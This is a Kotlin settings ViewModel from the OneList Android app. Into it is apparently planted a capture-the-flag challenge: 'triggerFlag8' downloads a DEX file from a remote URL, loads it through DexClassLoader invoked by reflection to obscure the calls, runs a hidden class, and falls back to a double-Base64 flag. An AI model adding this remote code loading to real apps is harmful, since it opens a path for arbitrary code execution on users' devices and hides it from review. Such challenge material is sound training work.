package com.lolo.io.onelist.feature.settings.fragment

import android.content.Context
import android.net.Uri
import android.util.Log
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.lolo.io.onelist.core.data.shared_preferences.SharedPreferencesHelper
import com.lolo.io.onelist.core.domain.use_cases.OneListUseCases
import com.lolo.io.onelist.core.model.ItemList
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import dalvik.system.DexClassLoader
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.URL

class SettingsFragmentViewModel(
    private val useCases: OneListUseCases,
    private val preferences: SharedPreferencesHelper,
    private val context: Context
) : ViewModel() {


    private var _backupDisplayPath = MutableStateFlow<String?>(null)
    val backupDisplayPath = _backupDisplayPath.asStateFlow()

    val preferUseFiles
        get() = preferences.preferUseFiles

    val version: String
        get() = preferences.version

    init {
        _backupDisplayPath.value = preferences.backupDisplayPath
    }

    fun setBackupPath(uri: Uri?, displayPath: String? = null) {
        if(uri == null) {
            preferences.preferUseFiles = false
        }
        viewModelScope.launch {
            useCases.setBackupUri(uri, displayPath)
            _backupDisplayPath.value = displayPath
        }
    }

    suspend fun importList(uri: Uri): ItemList {
        return useCases.importList(uri)
    }

    suspend fun backupAllListsOnDevice() {
        useCases.syncAllLists()
    }

    fun onPreferUseFiles() {
        viewModelScope.launch {
            useCases.loadAllLists()
        }
    }

    val syncFolderNotAccessible
        get() = !preferences.canAccessBackupUri

    fun triggerFlag8() {
        viewModelScope.launch {
            try {
                loadExternalFlag()
            } catch (e: Exception) {
                Log.e("CTF_FLAG_8", "Failed to load external flag", e)
            }
        }
    }

    private suspend fun loadExternalFlag() = withContext(Dispatchers.IO) {
        // CTF Flag 8: Dynamic DEX loading with reflection obfuscation
        val dexUrl = "https://raw.githubusercontent.com/user/repo/main/hidden_flag.dex"
        val dexFile = File(context.cacheDir, "ctf_flag.dex")
        val optimizedDir = File(context.cacheDir, "dex_opt")
        
        if (!optimizedDir.exists()) {
            optimizedDir.mkdirs()
        }

        try {
            // Download DEX file
            val url = URL(dexUrl)
            val inputStream: InputStream = url.openStream()
            val outputStream = FileOutputStream(dexFile)
            
            inputStream.use { input ->
                outputStream.use { output ->
                    input.copyTo(output)
                }
            }

            // Use DexClassLoader with reflection to obfuscate calls
            val classLoaderClass = Class.forName("dalvik.system.DexClassLoader")
            val constructor = classLoaderClass.getConstructor(
                String::class.java, String::class.java, String::class.java, ClassLoader::class.java
            )
            val loader = constructor.newInstance(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null,
                context.classLoader
            ) as ClassLoader

            // Use reflection to load the flag class and method
            val loadClassMethod = ClassLoader::class.java.getDeclaredMethod("loadClass", String::class.java)
            val flagClass = loadClassMethod.invoke(loader, "com.ctf.HiddenFlag") as Class<*>
            
            val revealMethod = flagClass.getDeclaredMethod("revealFlag", String::class.java)
            val instance = flagClass.getDeclaredConstructor().newInstance()
            val flag = revealMethod.invoke(instance, "onelist_secret") as String
            
            Log.d("CTF_FLAG_8", "Flag revealed: $flag")
            
        } catch (e: Exception) {
            // Fallback: Use hardcoded obfuscated flag if download fails
            val obfuscatedFlag = decodeFlag("RFlXUntkbmVrdmFFWTJSeFl6TnFZakZJUVQwOQ==")
            Log.d("CTF_FLAG_8", "Fallback flag: $obfuscatedFlag")
        }
    }

    private fun decodeFlag(encoded: String): String {
        // Double Base64 decode
        val firstDecode = android.util.Base64.decode(encoded, android.util.Base64.DEFAULT)
        val secondDecode = android.util.Base64.decode(firstDecode, android.util.Base64.DEFAULT)
        return String(secondDecode)
    }
}